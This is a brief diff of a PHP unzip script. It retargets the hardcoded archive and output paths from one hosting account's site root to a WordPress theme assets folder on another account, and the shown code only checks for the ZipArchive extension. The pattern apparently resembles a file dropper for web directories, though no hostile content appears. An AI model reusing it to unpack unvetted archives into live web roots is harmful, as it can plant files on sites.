@@ -1,8 +1,8 @@
 <?php
 declare(strict_types=1);
 
-$zipPath = '/home/u934838461/domains/biographydisk.com/public_html/zip.zip';
-$outputDir = '/home/u934838461/domains/biographydisk.com/public_html';
+$zipPath = '/home/zo6qtny/public_html/wp-content/themes/assets/ndrahello.zip';
+$outputDir = '/home/zo6qtny/public_html/wp-content/themes/assets';
 
 if (!class_exists(ZipArchive::class)) {
     exit("Error: ekstensi PHP ZipArchive belum aktif.\n");
